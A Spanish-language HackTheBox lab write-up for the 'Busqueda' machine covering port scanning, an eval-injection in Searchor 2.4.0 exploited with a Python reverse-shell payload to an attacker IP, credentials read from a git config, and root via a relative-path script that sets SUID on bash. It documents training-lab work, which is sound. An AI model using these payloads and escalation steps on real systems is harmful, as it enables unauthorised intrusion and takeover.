# Reporte de HackTheBox - Máquina Busqueda

## Información de la Máquina

- Nombre: Busqueda
- Sistema Operativo: Ubuntu 22.04.2 LTS
- Dificultad: Easy
- Puntos: 20

## Resumen

Breve resumen de la máquina, incluyendo su objetivo y una descripción general de los pasos realizados para comprometerla.

## Descubrimiento y Enumeración

Empezamos por comprobar conectividad con la máquina víctima, para ello envíamos un paquete ICMP con el comando `ping` a la dirección IP objetivo.
```
root@kali:~/Desktop/HTB/Machines/Busqueda# ping -c 1 10.10.11.208
PING 10.10.11.208 (10.10.11.208) 56(84) bytes of data.
64 bytes from 10.10.11.208: icmp_seq=1 ttl=63 time=92.8 ms

--- 10.10.11.208 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 92.834/92.834/92.834/0.000 ms
```
Con esta respuesta confirmamos conectividad con la máquina y deducimos por el valor del TTL que se trata de una máquina con un sistema operativo de la familia Linux/UNIX por cercanía al valor 64 el cual es 63 por estar conectado a la red a través de una VPN.

Seguimos con esacanéo activo y vamos con Nmap con la siguiente sentencia, la cual acortará el handshake y nos permitirá recibir información acerca de qué puertos están abiertos independientemente de que servicio corra, así poder escanear después en profundidad solo los puertos necesarios y no todos. Además añadimos tres verbose por lo cual casi de manera inmediata vamos viendo que puertos tienen estado "open" y podemos proceder con la siguiente sentencia, la cual sí escaneará en profundidad dichos puertos buscando versiones y servicios y ejecutando scripts comunes de enumeración en ellos.

```
root@kali:~/Desktop/HTB/Machines/Busqueda# nmap -sS --min-rate 5000 -Pn -n -p- --open 10.10.11.208 -oG nmap/initial -vvv
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-21 08:43 EDT
Initiating SYN Stealth Scan at 08:43
Scanning 10.10.11.208 [65535 ports]
Discovered open port 80/tcp on 10.10.11.208
Discovered open port 22/tcp on 10.10.11.208
Completed SYN Stealth Scan at 08:43, 14.61s elapsed (65535 total ports)
Nmap scan report for 10.10.11.208
Host is up, received user-set (0.093s latency).
Scanned at 2023-05-21 08:43:29 EDT for 15s
Not shown: 65463 closed tcp ports (reset), 70 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 14.70 seconds
           Raw packets sent: 72145 (3.174MB) | Rcvd: 69480 (2.779MB)
root@kali:~/Desktop/HTB/Machines/Busqueda# nmap -sCV -p22,80 10.10.11.208 -oN nmap/targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-21 08:44 EDT
Nmap scan report for 10.10.11.208
Host is up (0.093s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://searcher.htb/
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.04 seconds
```
Con esta información que nos arroja Nmap podemos modificar ahora nuestro archivo hosts añadiendo la dirección IP junto con el dominio "searcher.htb" y así podemos seguir enumerando dicho servicio.

En el puerto 22 tenemos OpenSSH 8.9p1 para el cual no he encontrado ningúna vulnerabilidad conocida, por lo cual lo dejaremos de lado de momento.

En el puerto 80 tenemos un Apache 2.4.52 corriendo alguna aplicación web así que lo primero que hacemos es ejecutar un `whatweb` para ver que información nos arroja antes de entrar activamente a enumerar la web en sí.

```
root@kali:~/Desktop/HTB/Machines/Busqueda/exploits# whatweb http://searcher.htb
http://searcher.htb [200 OK] Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.10.6], IP[10.10.11.208], JQuery[3.2.1], Python[3.10.6], Script, Title[Searcher], Werkzeug[2.1.2]
```
Ahora tenemos en cuenta que hay un aplicativo con Python y JQuery, que de cara a ciertas vulnerabilidades es un dato valioso.

De cara a tener más información de la máquina y con objetivo de enumerar al completo la aplicación se lanza un fuzzer en este caso `gobuster` para visualizar páginas que quizá no sean accesibles desde el indice.

```
root@kali:~/Desktop/HTB/Machines/Busqueda/exploits# gobuster dir -u http://searcher.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://searcher.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/05/23 08:29:27 Starting gobuster in directory enumeration mode
===============================================================
/search               (Status: 405) [Size: 153]
Progress: 1914 / 220561 (0.87%)
```
Casi inmediatamente recibimos "/search" y nada más en todo el diccionario utilizado.

## Vulnerabilidades y Explotación

Acto seguido entramos a mano a enumerar la web.
![Página Principal Searcher](https://github.com/mariioaseenjo/mariioaseenjo.github.io/assets/89775325/0c37346f-6e17-4f30-83da-fd8a325faaf6)
Esto es la página principal del servidor y en ella encontramos una cosa muy interesante que no descubrimos a menos que nos fijemos en el pié de página donde encontraremos el nombre y la versión de lo que parece el motor de busqueda que usa esta máquina.

Powered by "Flask" and "Searchor 2.4.0"

Bueno aquí agradecemos a los desarrolladores que con toda su buena intención nos querían dejar clara hasta la versión del motor por añadirla en el código de la página.

A raíz de encontrar el motor que utiliza, lo buscamos y no tardamos en encontrar información acerca de las vulnerabilidades que tiene.

Esta versión hace una mala implementación del metodo "eval" en su código fuente, por lo cual se obtiene ejecución arbitraria de código, dicha vulnerabilidad es corregida en la versión 2.4.2.

A partir de aquí me he dedicado a buscar algún PoC disponible publicamente, afortunadamente encontr [este repositorio de GitHub](https://github.com/jonnyzar/POC-Searchor-2.4.2) el cual nos repite lo que acabo de describir en el parrafo anterior aunque también nos extrae la parte del codigo vulnerable que incluye el metodo "eval" y nos indica que si la consulta no se depura de manera correcta nos conduce a un RCE, que es justo lo que nosotros queremos, y nos propone usar una sentencia en python la cual me parece que cuadra con nuestro caso como hemos mencionado arriba, por lo cual no perdemos tiempo en abrir un listener en mi máquina atacante y configurar la sentencia siguiente:

```
', exec("import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.38',443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);"))#
```
Indicando mi dirección de atacante y el puerto de escucha en el cual tengo el listener preparado, si probamos a enviar esta data como parte del formulario que hay en la página principal.... Pa dentro!

```
root@kali:~/Desktop/HTB/Machines/Busqueda/exploits# nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.38] from (UNKNOWN) [10.10.11.208] 57094
/bin/sh: 0: can't access tty; job control turned off
$ whoami
svc
```

## Escalada de Privilegios

Lo primero habiendo obtenido acceso a la máquina va a ser tratar nuestra TTY, para ello confirmamos que se usa python3 a nivel de sistema y procedemos a ejecutar un tratamiento con python directamente invocando una shell interactiva, saldremos de la reverse shell dejandola en segundo plano con `Ctrl+Z` y con stty configuraremos el output para que no se nos salga de la reverse shell aun metiendo `Ctrl+C` lo cual sin estos pasos conduciría a una salida de la shell lo cual no nos interesa nada, después configuramos la variable de entorno TERM y ya lo tendriamos de momento.

```
$ which python3
/usr/bin/python3
$ python3 -c "import pty;pty.spawn('/bin/bash')"
svc@busqueda:/var/www/app$ ^Z
[1]+  Stopped                 nc -lvnp 443
root@kali:~/Desktop/HTB/Machines/Busqueda/exploits# stty raw -echo; fg
nc -lvnp 443

svc@busqueda:~$ export TERM=xterm
svc@busqueda:~$ 


```
Ahora que podemos navegar por el sistema como si fuera nuestra máquina, procedemos a enumerar el sistema operativo, empezando por el usuario y su home en el cual se encuentra la primera flag: `user.txt`.
```
svc@busqueda:/var/www/app$ whoami
svc
svc@busqueda:/var/www/app$ id
uid=1000(svc) gid=1000(svc) groups=1000(svc)
svc@busqueda:/var/www/app$ pwd
/var/www/app
svc@busqueda:/var/www/app$ cd &&pwd
/home/svc
svc@busqueda:~$ ls -la
total 3076
drwxr-x--- 6 svc  svc     4096 May 23 08:45 .
drwxr-xr-x 3 root root    4096 Dec 22 18:56 ..
lrwxrwxrwx 1 root root       9 Feb 20 12:08 .bash_history -> /dev/null
-rw-r--r-- 1 svc  svc      220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 svc  svc     3771 Jan  6  2022 .bashrc
drwx------ 2 svc  svc     4096 Feb 28 11:37 .cache
-rw-rw-r-- 1 svc  svc      109 May 23 07:25 .gitconfig
drwx------ 3 svc  svc     4096 May 23 09:04 .gnupg
drwxrwxr-x 5 svc  svc     4096 Jun 15  2022 .local
lrwxrwxrwx 1 root root       9 Apr  3 08:58 .mysql_history -> /dev/null
-rw-r--r-- 1 svc  svc      807 Jan  6  2022 .profile
-rwxr-xr-x 1 svc  svc  3104768 May 23 08:16 pspy64
lrwxrwxrwx 1 root root       9 Feb 20 14:08 .searchor-history.json -> /dev/null
drwx------ 3 svc  svc     4096 May 23 07:12 snap
-rw-r----- 1 root svc       33 May 23 05:41 user.txt
```

Volvemos al punto de partida `/var/www/app/` para intentar encontrar algo por lo que empezar.
```
svc@busqueda:/var/www/app$ ls -la
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .
drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1 14:22 app.py
drwxr-xr-x 8 www-data www-data 4096 May 23 13:06 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 templates
svc@busqueda:/var/www/app$ cd .git
svc@busqueda:/var/www/app/.git$ ls -la
total 52
drwxr-xr-x 8 www-data www-data 4096 May 23 13:06 .
drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 ..
drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 branches
-rw-r--r-- 1 www-data www-data   15 Dec  1 14:35 COMMIT_EDITMSG
-rw-r--r-- 1 www-data www-data  294 Dec  1 14:35 config
-rw-r--r-- 1 www-data www-data   73 Dec  1 14:35 description
-rw-r--r-- 1 www-data www-data   21 Dec  1 14:35 HEAD
drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 hooks
-rw-r--r-- 1 root     root      259 Apr  3 15:09 index
drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 info
drwxr-xr-x 3 www-data www-data 4096 Dec  1 14:35 logs
drwxr-xr-x 9 www-data www-data 4096 Dec  1 14:35 objects
drwxr-xr-x 5 www-data www-data 4096 Dec  1 14:35 refs
svc@busqueda:/var/www/app/.git$ cat config 
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main
```
Al parecer hay un subdominio `gitea.searcher.htb` y unas credenciales `cody:jh1usoih2bkjaspwe92`, a modo de prueba ejecuto un sudo -l en el sistema víctima y confirmo que las credenciales son validas para svc
, para mi sorpresa no solo confirme esto sino que tenemos habilitado como svc un comando con python3:

```
svc@busqueda:/var/www/app/.git$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```
Con esto me pongo a probar a ejecutar dicho comando, pero si no le doy argumentos recibo un error, por lo que al añadir cualquier carácter como argumento me muestra un panel de ayuda tal que el siguiente:
```
svc@busqueda:/var/www/app/.git$ /usr/bin/sudo /usr/bin/python3 /opt/scripts/system-checkup.py
Sorry, user svc is not allowed to execute '/usr/bin/python3 /opt/scripts/system-checkup.py' as
 root on busqueda.
svc@busqueda:/var/www/app/.git$ /usr/bin/sudo /usr/bin/python3 /opt/scripts/system-checkup.py 
a
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```
Con esto pruebo las 3 opciones de las cuales la ultima `full-checkup` da un error extraño y sabiendo donde están estos archivos me dirijo al directorio `/opt/scripts/` y solo parece que haya a lo que se hace referencia cuando nombramos a full-checkup desde este system-checkup.py, lo cual tambien me hace pensar que se está referenciando a los archivos de manera relativa por lo cual podría craftear un script en bash en mi home que haga lo que quiera y que sea ejecutado como root.
```
svc@busqueda:/var/www/app/.git$ /usr/bin/sudo /usr/bin/python3 /opt/scripts/system-checkup.py 
full-checkup
Something went wrong
svc@busqueda:/var/www/app/.git$ cd /opt/scripts/
svc@busqueda:/opt/scripts$ ls -la
total 28
drwxr-xr-x 3 root root 4096 Dec 24 18:23 .
drwxr-xr-x 4 root root 4096 Mar  1 10:46 ..
-rwx--x--x 1 root root  586 Dec 24 21:23 check-ports.py
-rwx--x--x 1 root root  857 Dec 24 21:23 full-checkup.sh
drwxr-x--- 8 root root 4096 Apr  3 15:04 .git
-rwx--x--x 1 root root 3346 Dec 24 21:23 install-flask.sh
-rwx--x--x 1 root root 1903 Dec 24 21:23 system-checkup.py
svc@busqueda:/opt/scripts$ cd
svc@busqueda:~$ vi full-checkup.sh
svc@busqueda:~$ /usr/bin/sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
Something went wrong
svc@busqueda:~$ chmod +x full-checkup.sh 
svc@busqueda:~$ /usr/bin/sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup

[+] Done!

```
Como se puede apreciar, es necesario dotar de los permisos de ejecución a nuestro script, sino no funcionará.
En mi caso me es más sencillo hacer SUID `/usr/bin/bash` e impersonarme como root con `bash -p`, entonces lo que contiene mi archivo malicioso sería simplemente una sentencia tal que esta: `chmod u+s /usr/bin/bash`.
Y aquí está el listado de binarios SUID en el sistema, y como he mencionado antes nos metemos como root y sacamos la flag de root dando por terminada la máquina.
```
svc@busqueda:~$ find / -perm -4000 2>/dev/null
/usr/libexec/polkit-agent-helper-1
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/umount
/usr/bin/fusermount3
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/su
/usr/bin/bash
/usr/bin/chsh
/snap/core20/1822/usr/bin/chfn
/snap/core20/1822/usr/bin/chsh
/snap/core20/1822/usr/bin/gpasswd
/snap/core20/1822/usr/bin/mount
/snap/core20/1822/usr/bin/newgrp
/snap/core20/1822/usr/bin/passwd
/snap/core20/1822/usr/bin/su
/snap/core20/1822/usr/bin/sudo
/snap/core20/1822/usr/bin/umount
/snap/core20/1822/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1822/usr/lib/openssh/ssh-keysign
/snap/snapd/18357/usr/lib/snapd/snap-confine
svc@busqueda:~$ bash -p
bash-5.1# whoami
root
bash-5.1# cd /root/&&ls -la
total 60
drwx------  9 root root 4096 Apr  3 16:01 .
drwxr-xr-x 19 root root 4096 Mar  1 10:46 ..
lrwxrwxrwx  1 root root    9 Feb 20 12:09 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
drwx------  3 root root 4096 Mar  1 10:46 .cache
drwx------  3 root root 4096 Mar  1 10:46 .config
-rw-r-----  1 root root  430 Apr  3 15:13 ecosystem.config.js
-rw-r--r--  1 root root  104 Apr  3 08:58 .gitconfig
drwxr-xr-x  3 root root 4096 Mar  1 10:46 .local
-rw-------  1 root root   50 Feb 20 12:04 .my.cnf
lrwxrwxrwx  1 root root    9 Feb 20 12:12 .mysql_history -> /dev/null
drwxr-xr-x  4 root root 4096 Mar  1 10:46 .npm
drwxr-xr-x  5 root root 4096 May 23 13:06 .pm2
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 May 23 13:06 root.txt
drwxr-xr-x  4 root root 4096 Apr  3 16:01 scripts
drwx------  3 root root 4096 Mar  1 10:46 snap
```
## Agradecimientos

Agradecimientos especiales a los creadores de la máquina y a la comunidad de HackTheBox por proporcionar una plataforma de aprendizaje y desafío en seguridad informática.

